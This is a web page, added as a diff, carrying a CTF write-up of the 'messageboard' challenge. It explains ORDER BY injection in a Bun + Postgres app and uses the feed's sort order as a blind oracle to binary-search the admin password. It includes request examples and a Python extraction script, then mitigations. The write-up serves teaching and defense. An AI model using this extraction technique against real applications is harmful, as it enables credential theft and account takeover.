@@ -1,0 +1,210 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" content="#080706">
+  <meta name="description" content="A Bun + Postgres stories app whitelists every input to alphanumerics — which kills classic SQLi, but is exactly enough to name columns in an ORDER BY. We turn the sort order into a blind boolean oracle, binary-search admin&#x27;s password character by character, then walk in through the front door.">
+  <meta property="og:type" content="article">
+  <meta property="og:site_name" content="0xAdham Field Notes">
+  <meta property="og:title" content="gaslightCTF: messageboard · 0xAdham">
+  <meta property="og:description" content="A Bun + Postgres stories app whitelists every input to alphanumerics — which kills classic SQLi, but is exactly enough to name columns in an ORDER BY. We turn the sort order into a blind boolean oracle, binary-search admin&#x27;s password character by character, then walk in through the front door.">
+  <meta name="twitter:card" content="summary_large_image">
+  <title>gaslightCTF: messageboard · 0xAdham</title>
+  <link rel="icon" type="image/svg+xml" href="/assets/mark.svg">
+  <link rel="stylesheet" href="/assets/site.css">
+</head>
+<body>
+  <header class="site-header">
+    <div class="wrap header-inner">
+      <a class="brand" href="/" aria-label="0xAdham Field Notes home">
+        <svg class="brand-mark" viewBox="0 0 40 40" aria-hidden="true"><path d="M10 4H4v32h6M30 4h6v32h-6" fill="none" stroke="currentColor" stroke-width="3"/><rect x="12" y="17" width="7" height="7" fill="currentColor"/><rect x="22" y="17" width="7" height="7" fill="#ff3428"/></svg>
+        <span class="brand-name">0xADHAM</span><span class="brand-note">Field notes / security research</span>
+      </a>
+      <button class="menu-toggle" type="button" aria-expanded="false" aria-controls="primary-nav">[ Menu ]</button>
+      <nav class="nav-links" id="primary-nav" aria-label="Main navigation">
+        <a href="/">Home</a><a href="/writing/" aria-current="page">Writing</a><a href="/research/">Research</a><a href="/about/">About</a>
+      </nav>
+    </div>
+  </header>
+  <main>
+    <div class="wrap article-header">
+      <div class="eyebrow"><span class="index">FIELD NOTE</span> CTF</div>
+      <h1 class="page-title">gaslightCTF: messageboard</h1>
+      <div class="article-byline">
+        <span>By Adham Mohammed / 0xAdham</span>
+        <span>2026-08-14</span>
+        <span>CTF · Web security research</span>
+      </div>
+    </div>
+    <section class="section">
+      <div class="wrap content-layout">
+        <article class="prose">
+          <p><strong>Platform:</strong> gaslightCTF<br />
+<strong>Challenge:</strong> messageboard<br />
+<strong>Category:</strong> Web<br />
+<strong>Difficulty:</strong> Medium<br />
+<strong>Tags:</strong> <code>sqli</code> <code>order-by-injection</code> <code>blind</code> <code>boolean-oracle</code> <code>postgres</code> <code>bun</code></p>
+<p><strong>Solved by 0xAdham.</strong></p>
+<p>messageboard is gaslightCTF's social stories app — post a short public update, share something with your close friends, scroll the feed. The dev hardened the query layer properly: every user-supplied value is run through an alphanumeric-only <code>filter()</code> before it touches SQL, and <code>sql.unsafe</code> is the only query helper in the codebase. No parameters, no ORM — just "trust the whitelist." The flag sits in <code>admin.close_friends</code>, behind a list you're not on. The gaslight is the whitelist itself: they forgot that alphanumerics are <em>exactly enough</em> to name a column.</p>
+<h2>TL;DR</h2>
+<p>This challenge chains two steps:</p>
+<ol>
+<li><strong>ORDER BY injection</strong> → turn the public feed's sort order into a blind boolean oracle on <code>secret</code></li>
+<li><strong>Binary-search the oracle</strong> → recover admin's 16-hex-char password, log in as admin, read <code>close_friends</code></li>
+</ol>
+<h2>Chapter 1: Reading the Source</h2>
+<h3>The Stack</h3>
+<p>Stack (from the handout): <code>Bun.serve()</code> routes + Postgres via <code>Bun.sql</code>. The query helper is a single export:</p>
+<pre><code class="language-js">export const query = sql.unsafe;
+</code></pre>
+<p>Raw string execution, no parameters, every query is a template literal. That's the attack surface.</p>
+<h3>The Schema</h3>
+<pre><code class="language-sql">CREATE TABLE users (
+  name TEXT PRIMARY KEY,
+  secret TEXT NOT NULL,
+  public TEXT, public_expiry TIMESTAMPTZ,
+  close_friends TEXT, close_friends_expiry TIMESTAMPTZ,
+  close_friends_list TEXT[] NOT NULL DEFAULT '{}'
+);
+</code></pre>
+<p>Seed notes: <strong><code>admin.close_friends = FLAG</code></strong>, <code>admin.close_friends_list = ['alice','carol','dave']</code>, and <code>admin</code> has a public story. That last part matters.</p>
+<h3>The Feed Endpoint</h3>
+<p><code>GET /api/stories</code> has two query branches — one for the public feed, one for close friends:</p>
+<pre><code class="language-js">const column = url.searchParams.get(&quot;column&quot;) || &quot;name&quot;;
+const order  = url.searchParams.get(&quot;order&quot;)  || &quot;ASC&quot;;
+if (!filter(column) || !filter(order)) return 400;
+
+// public feed — admin IS here (has a public story)
+`... FROM users WHERE public IS NOT NULL AND public_expiry &gt; now()
+ ORDER BY ${column} ${order}`
+
+// close-friends feed — only rows where YOU are in the author's list
+`... close_friends AS story ...
+ WHERE close_friends IS NOT NULL AND close_friends_expiry &gt; now()
+   AND (close_friends_list @&gt; ARRAY['${name}'] OR name = '${name}')
+ ORDER BY ${column} ${order}`
+</code></pre>
+<p><code>column</code> and <code>order</code> both come from query params, both pass through <code>filter()</code>, and both land directly in the <code>ORDER BY</code> clause — no quotes, no parameterization. That's our injection point.</p>
+<h3>The "Sanitizer"</h3>
+<pre><code class="language-js">const whitelist = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;
+export function filter(str) {
+  for (const c of [...str]) if (!whitelist.includes(c)) return false;
+  return true;
+}
+</code></pre>
+<p>Pure <code>[A-Za-z0-9]</code>. Applied to <strong>every</strong> input that reaches SQL — <code>name</code>, <code>password</code>, <code>friends[]</code>, <code>column</code>, <code>order</code>. No quote ever gets through, so classic string SQLi is dead everywhere a value sits inside <code>'...'</code>. The session <code>name</code> only ever comes from a filtered signup or a DB-stored name, so that's clean too.</p>
+<p>The gaslight: the devs thought "no quote = no SQLi." They were right about string contexts. They forgot about identifier contexts.</p>
+<h2>Chapter 2: The Bug — Alphanumeric Is Enough in ORDER BY</h2>
+<p><code>column</code> and <code>order</code> don't live inside quote marks — they're in an <strong>identifier/expression context</strong>. In SQL, column names are alphanumeric. <code>[A-Za-z0-9]</code> is exactly the charset you need to name a real column.</p>
+<p>Confirm injection:</p>
+<pre><code>column=name         -&gt; 200  ✓ valid column
+column=boguscol     -&gt; 500  ✗ unknown column → error bubbles up = raw injection confirmed
+column=secret       -&gt; 200  ✓ sorts the feed by users.secret
+column=close_friends -&gt; 400 ✗ blocked: '_' isn't in the whitelist
+</code></pre>
+<p>The <code>500</code> on <code>boguscol</code> is the proof. The SQL error means our value hit the parser — not a sanitizer. We have injection.</p>
+<h3>What We Can (and Can't) Do</h3>
+<p>The whitelist shapes the exploit pretty tightly:</p>
+<table>
+<thead>
+<tr>
+<th>Blocked char</th>
+<th>Rules out</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>_</code></td>
+<td>Can't name <code>close_friends</code>, <code>close_friends_list</code>, <code>close_friends_expiry</code></td>
+</tr>
+<tr>
+<td>spaces, <code>(</code>, <code>)</code>, <code>,</code>, quotes</td>
+<td>No subqueries, no <code>CASE</code>, no <code>UNION</code>, no stacked queries</td>
+</tr>
+</tbody>
+</table>
+<p>The only underscore-free columns in <code>users</code> are <strong><code>name</code></strong>, <strong><code>secret</code></strong>, and <strong><code>public</code></strong>.</p>
+<p>The flag column (<code>close_friends</code>) is only reachable by its alias <code>story</code> or positional <code>3</code> in the close-friends branch — but admin never appears in that result set for a non-friend. Dead end for a direct read.</p>
+<p>So the injection can't print the flag. But it can do something else: <code>ORDER BY secret</code> reorders the <strong>public</strong> feed (which <em>does</em> include admin, because admin has a public story) by each row's <code>secret</code> value. The JSON response order equals the sort order equals a <strong>boolean comparison oracle</strong> on secrets.</p>
+<h2>Chapter 3: Blind-Extracting admin's Secret</h2>
+<p><code>admin.secret</code> is generated as <code>crypto.getRandomValues(8 bytes).toHex()</code> — 16 lowercase hex characters.</p>
+<h3>The Oracle</h3>
+<p>Register <strong>pivot accounts</strong> with a <code>secret</code> (password) I choose, give each one a public story so it appears in the feed, then ask:</p>
+<blockquote>
+<p>In <code>ORDER BY secret ASC</code>, does admin sort <em>after</em> my pivot?</p>
+</blockquote>
+<p>For a known prefix <code>P</code> and candidate digit <code>d</code>, a pivot with <code>secret = P + d</code> satisfies (lexicographic order): <code>admin.secret &gt; P+d  ⟺  admin.secret[i] &gt;= d</code>.</p>
+<p>So: <strong>admin sorts after the pivot ⟺ the next unknown character ≥ d</strong> — a clean binary search.</p>
+<h3>The Script</h3>
+<pre><code class="language-python">def admin_after(pivot_secret):           # is admin.secret &gt; pivot_secret?
+    name = make_pivot(pivot_secret)       # signup(pw=pivot_secret) + post a public story
+    order = order_by(&quot;secret&quot;, &quot;ASC&quot;)    # GET /api/stories?column=secret&amp;order=ASC
+    return order.index(&quot;admin&quot;) &gt; order.index(name)
+
+HEX = &quot;0123456789abcdef&quot;
+secret = &quot;&quot;
+for _ in range(16):
+    lo, hi = 0, 15
+    while lo &lt; hi:
+        mid = (lo + hi + 1) // 2
+        lo, hi = (mid, hi) if admin_after(secret + HEX[mid]) else (lo, mid - 1)
+    secret += HEX[lo]
+</code></pre>
+<p>4 comparisons per character × 16 characters = ~64 pivot registrations. Each one posts a public story and fires a single sort query. The feed position does the rest.</p>
+<p>Result:</p>
+<pre><code>admin.secret = 4e82b211910f98e6
+</code></pre>
+<h2>Chapter 4: Reading the Flag</h2>
+<p>With the secret in hand, log in as admin:</p>
+<pre><code>POST /api/login  {&quot;name&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;4e82b211910f98e6&quot;}  -&gt; 200
+</code></pre>
+<p>The close-friends query has an <code>OR name = '${session}'</code> branch, so admin sees admin's own close-friends story without needing to be on anyone's list:</p>
+<pre><code>GET /api/stories
+  -&gt; {&quot;author&quot;:&quot;admin&quot;,&quot;visibility&quot;:&quot;close_friends&quot;,
+      &quot;story&quot;:&quot;gaslightCTF{ar3_y0u_my_cl0s3_fr13nd_n0w?_4a7e0f6b6500}&quot;}
+</code></pre>
+<h2>Flag</h2>
+<pre><code>gaslightCTF{ar3_y0u_my_cl0s3_fr13nd_n0w?_4a7e0f6b6500}
+</code></pre>
+<h2>Mitigations</h2>
+<p><strong>Allowlist column and order against a fixed set</strong></p>
+<p>The root cause is treating <code>column</code> and <code>order</code> as free-form alphanumeric input rather than as a finite enumeration of known-safe values. The fix:</p>
+<pre><code class="language-js">const ALLOWED_COLUMNS = new Set([&quot;name&quot;, &quot;public&quot;]);
+const ALLOWED_ORDERS  = new Set([&quot;ASC&quot;, &quot;DESC&quot;]);
+
+if (!ALLOWED_COLUMNS.has(column) || !ALLOWED_ORDERS.has(order)) return 400;
+</code></pre>
+<p>This collapses the attack surface to zero — there's no valid column left that can leak anything sensitive, and no way to inject an arbitrary identifier.</p>
+<p><strong>Parameterize everything else</strong></p>
+<p><code>sql.unsafe</code> with string interpolation is dangerous by default. Use parameterized queries for every value, and reserve identifiers (column names, table names) for the allowlist approach above — those can't be parameterized at the driver level anyway, so allowlisting is the correct control.</p>
+<p><strong>Don't expose sort order as a side channel</strong></p>
+<p>Even with the injection closed, sorting a feed by a private column (<code>secret</code>) and reflecting the result order is a side-channel leak. If <code>secret</code> is a password, it has no business being a sortable column on a public endpoint. The public feed should expose only columns safe to order by — <code>name</code> and <code>public</code> here, not <code>secret</code>.</p>
+<hr />
+<p><em>0xAdham</em></p>
+        </article>
+        <aside class="article-aside">
+          <div class="eyebrow"><span class="index">FIELD NOTE</span> Details</div>
+          <h2>Clear. Scoped. Reproducible.</h2>
+          <p>A Bun + Postgres stories app whitelists every input to alphanumerics — which kills classic SQLi, but is exactly enough to name columns in an ORDER BY. We turn the sort order into a blind boolean oracle, binary-search admin&#x27;s password character by character, then walk in through the front door.</p>
+          <div style="margin: 20px 0; padding-top: 16px; border-top: 1px solid var(--line); font-size: 13px; font-family: var(--mono); color: var(--muted); line-height: 1.8;">
+            <div><strong style="color:var(--ink)">Published:</strong> 2026-08-14</div>
+            <div><strong style="color:var(--ink)">Category:</strong> CTF</div>
+            
+          </div>
+          <a class="button" href="/writing/">Back to archive <span class="arrow" aria-hidden="true">←</span></a>
+        </aside>
+      </div>
+    </section>
+  </main>
+  <footer class="site-footer">
+    <div class="wrap">
+      <div class="footer-bottom">
+        <span>© 2026 · 0xAdham</span>
+        <a href="/writing/">Return to writing ↑</a>
+      </div>
+    </div>
+  </footer>
+  <script src="/assets/site.js" defer></script>
+</body>
+</html>
